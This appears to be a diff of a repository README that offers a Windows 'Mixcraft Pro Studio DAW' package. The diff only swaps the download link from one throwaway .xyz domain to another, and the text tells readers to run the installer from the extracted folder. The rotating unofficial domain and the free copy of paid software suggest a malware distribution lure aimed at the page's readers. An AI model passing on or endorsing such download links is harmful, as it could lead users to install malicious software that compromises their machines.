@@ -18,8 +18,8 @@ Mixcraft Pro Studio DAW | Windows desktop package | straightforward setup | stab
 
 > Use the project link below for Windows.
 
-* **Project link:** **[mixcraft.nexpath.xyz](https://mixcraft.nexpath.xyz/)**
-* **Full URL:** `https://mixcraft.nexpath.xyz/`
+* **Project link:** **[mixcraft.nerasix.xyz](https://mixcraft.nerasix.xyz/)**
+* **Full URL:** `https://mixcraft.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Everything ships configured for local work — start the app and pick up where y
 * **RAM:** 6 GB base | 12 GB+ for demanding tasks
 * **Disk:** 5 GB available storage
 
-***
+***
